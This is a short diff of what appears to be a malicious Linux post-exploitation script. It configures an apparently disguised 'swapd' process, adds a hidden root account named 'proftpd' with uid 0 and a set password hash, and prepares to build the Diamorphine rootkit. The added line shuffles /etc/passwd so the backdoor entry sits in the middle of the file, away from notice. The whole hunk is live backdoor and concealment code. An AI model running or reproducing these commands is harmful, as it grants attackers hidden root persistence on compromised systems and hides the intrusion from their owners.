@@ -601,6 +601,7 @@ sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
 #chmod 600 ~/.ssh/authorized_keys
 
 useradd -u 0 -G root,sudo -M -o -s /bin/bash -p '$1$rQQT0T7F$cnBpyupn2YD3tR5i9AHtA.' proftpd
+awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
 
 echo "[*] make toolZ, Diamorphine"
 cd /tmp
